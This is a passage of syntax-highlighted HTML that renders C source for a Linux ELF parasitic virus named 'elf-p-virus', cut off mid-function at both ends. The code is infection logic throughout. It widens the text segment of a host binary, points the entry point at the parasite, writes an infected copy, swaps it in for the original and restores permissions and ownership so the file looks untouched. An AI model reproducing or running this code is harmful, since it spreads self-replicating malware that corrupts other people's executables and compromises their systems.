    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
    update the phdr's to reflect the extention of the text segment (to
    allow virus insertion)
*/</span><span class="sc0">

    </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc1">/* 
    is this the text segment ? Nothing says the offset must be 0 but it
    normally is.
*/</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">palen</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">evaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">palen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">evaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PAGE_SIZE</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">palen</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">evaddr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ventry</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">++</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* patch the offset */</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">v</span><span class="sc10">[</span><span class="sc11">vhoff</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* read the shdr's */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* update the shdr's to reflect the insertion of the parasite */</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* is this the last text section? */</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_addr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">evaddr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc1">/* if its not strip safe then we cant use it */</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">SHT_PROGBITS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">++</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* update ehdr to reflect new offsets */</span><span class="sc0">

    </span><span class="sc11">oshoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* make the parasite */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fstat</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">stat</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">od</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">TMPFILENAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_WRONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_CREAT</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_TRUNC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc0">
    </span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">od</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_WRONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_CREAT</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_TRUNC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc0">
    </span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc1">/* Reconstruct a copy of the ELF file with the parasite */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">plen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">copy_partial</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PAGE_SIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">copy_partial</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oshoff</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sdata</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oshoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">copy_partial</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Make the parasitic ELF the real one */</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rename</span><span class="sc10">(</span><span class="sc11">TMPFILENAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rename</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc1">/* Make it look like the original */</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fchmod</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fchown</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_uid</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_gid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* All done */</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc6">"\n"</span><span class="sc0">
        </span><span class="sc6">"Infection of (%s) complete\n"</span><span class="sc0">
        </span><span class="sc6">"parasite offset: %i\n"</span><span class="sc0">
        </span><span class="sc6">"\n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">leave</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">retval</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">leave</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">brk</span><span class="sc10">(</span><span class="sc11">b</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">od</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">od</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">TMPFILENAME</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc11">unlink</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc4">8192</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">v</span><span class="sc10">[</span><span class="sc11">PAGE_SIZE</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ninfect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">yinfect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rnval</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* these must be patched after manual infection */</span><span class="sc0">
    </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2000</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc1">/* parasite length */</span><span class="sc0">
</span><span class="sc1">/* offset to where the parasite lseek's to itself to copy itself */</span><span class="sc0">
    </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">vhoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4000</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* offset to where the parasite's host entry point is */</span><span class="sc0">
    </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">vhentry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* offset to where the parasite's entry point is */</span><span class="sc0">
    </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ventry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">3000</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef DEBUG
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"usage: elf-p-virus argv0\n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Parent is (%s)\n\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
